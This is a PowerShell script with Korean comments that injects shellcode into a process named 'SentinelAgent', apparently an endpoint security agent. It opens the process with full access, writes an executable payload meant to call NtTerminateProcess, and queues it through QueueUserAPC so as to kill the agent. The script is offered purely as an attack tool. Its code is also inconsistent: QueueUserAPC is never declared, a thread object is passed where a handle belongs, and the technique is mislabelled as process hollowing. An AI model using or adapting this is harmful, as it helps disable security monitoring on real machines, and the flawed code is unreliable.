# Windows API 선언
$code = @"
using System;
using System.Runtime.InteropServices;

public class WinAPI {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

    [DllImport("ntdll.dll")]
    public static extern IntPtr NtTerminateProcess(IntPtr hProcess, int exitStatus);
}
"@
Add-Type -TypeDefinition $code -Language CSharp

# 대상 프로세스 선택
$targetProcess = "SentinelAgent"
$proc = Get-Process | Where-Object { $_.ProcessName -eq $targetProcess }
if (-not $proc) {
    Write-Host "[!] Process $targetProcess not found! Exiting..."
    exit
}
$targetPID = $proc.Id
Write-Host "[+] Found Process: $targetProcess (PID: $targetPID)"

# Windows API 상수 값
$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT = 0x1000
$PAGE_EXECUTE_READWRITE = 0x40

# 새 셸코드: NtTerminateProcess 호출
$payload = [byte[]] (0x6A, 0x00, 0x68, 0xFF, 0xFF, 0xFF, 0xFF, 0xB8, 0x29, 0x27, 0x93, 0x77, 0xFF, 0xD0)

# 프로세스 핸들 열기
$hProcess = [WinAPI]::OpenProcess($PROCESS_ALL_ACCESS, $false, $targetPID)
$mem = [WinAPI]::VirtualAllocEx($hProcess, [IntPtr]::Zero, 1024, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)
$written = 0
$writeSuccess = [WinAPI]::WriteProcessMemory($hProcess, $mem, $payload, $payload.Length, [ref]$written)

# `QueueUserAPC` 우회 적용
$hThread = Get-Process | Where-Object { $_.ProcessName -eq $targetProcess } | Select-Object -ExpandProperty Threads | Select-Object -First 1
[WinAPI]::QueueUserAPC($mem, $hThread, 0)

Write-Host "[DEBUG] WriteProcessMemory Success: $writeSuccess (Bytes Written: $written)"
Write-Host "[DEBUG] QueueUserAPC Injected into Thread"

Write-Host "[+] Process Hollowing completed!"
Read-Host "Press Enter to exit"
